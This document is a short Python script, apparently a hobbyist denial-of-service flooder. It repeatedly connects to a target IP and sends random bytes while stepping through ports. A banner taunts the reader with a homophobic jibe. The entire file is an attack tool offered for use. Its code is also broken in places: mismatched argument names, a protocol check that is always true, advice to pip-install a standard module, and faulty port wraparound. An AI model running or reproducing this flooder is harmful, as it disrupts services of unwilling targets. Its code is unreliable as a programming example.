import time
import os
import sys
import random
import argparse

using_datetime = True

try:
  import socket
  from socket import *
  
except ImportError: 
  input(
      f"Module socket not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install socket.\npress enter to exit")
  exit()
  
try:
  import datetime  
except ImportError:
  input(
      f"Module rdatetimenot installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install rdatetime\nPif you don't want to install datetime module you can proces the attack!")
  using_datetime = False


#if using_datetime is True:
  #now = datetime.now()
  #min = now.minute
  #hour = now.hour
  #day = now.hour
  #month = now.month
  #year = now.month



print("Simp on Lemonade1S#5327 and CNJ#0516 or you’re Gay! >_<")
time.sleep(2)
os.system("clear")

print("""
 ___           ___________    __________________     ______________     _____________     ______________     __________       __________
/\  \         |\   _______\  |\                 \   |\   _______   \   |\    ____    \   |\    ____     \   |\  _______\__   |\  _______\
\ \  \        | \  \_______  | \   \ /\   \ /\   \  | \  \______|\  \  | \   \___/\   \  | \   \___/\    \  | \ \______|\ \  | \ \_______
 \ \  \        \ \   ______\  \ \   \  \   \  \   \  \ \  \     \ \  \  \ \   \  \ \   \  \ \    ____     \  \ \ \     \ \ \  \ \  _______\
  \ \  \______  \ \  \_______  \ \   \  \   \  \   \  \ \  \_____\_\  \  \ \   \  \ \   \  \ \   \___/\    \  \ \ \_____\_\ \  \ \ \_______
   \ \_________\ \ \_________\  \ \___\  \___\  \___\  \ \_____________\  \ \___\  \ \___\  \ \___\  \ \____\  \ \__________/   \ \_________\
    \/_________/  \/_________/   \/___/ \/___/ \/___/   \/_____________/   \/___/   \/___/   \/___/   \/____/   \/_________/     \/_________/
     
      """)

parser = argparse.ArgumentParser()

parser.add_argument('--TARGET', '--T', type = str, help = 'Target IP', required = True)
parser.add_argument('--PORT', '--P', type = int, default = '80', help = 'Port', required = True)
parser.add_argument('--protocol', '--p', type = str, default = 'UDP', help = 'Transport protocol', choices = ['UDP', 'TCP'])

arguments = parser.parse_args()

#ip = input("Target: ")
#port = input("Port: ")
#protocol = input("protocol(UDP/TCP): ")

ip = arguments.target
port = arguments.port
protocol = arguments.protocol

bytes = random._urandom(1490)
pocket = 0




if protocol == "tcp" or "TCP": 
  s = socket(AF_INET, SOCK_STREAM)

elif protocol == "udp" or "UDP":
  s = socket(AF_INET, SOCK_DGRAM)
  
else:
  print("undefined protocol!, Ctrl + C to close!")

os.system("clear")
#ip = input("Target IP: ")
#port = input("Port: ")
#sleep_time = int(input("Time sleep(suggestion: 2 /default=2): "))
#os.system ("clear")

#if sleep_time is None:
  #sleep_time = 2 

while True:
  #ifndto(bytes, (ip, int(port)))
  #s.connect((ip, int(port)))
  s.connect((ip, port))
  s.send(bytes)
  pocket = pocket + 1
  print(f"pocket{pocket}")
  time.sleep(2)
  port = int(port) + 1
  if port == 65543:
    port = int(port) - 1
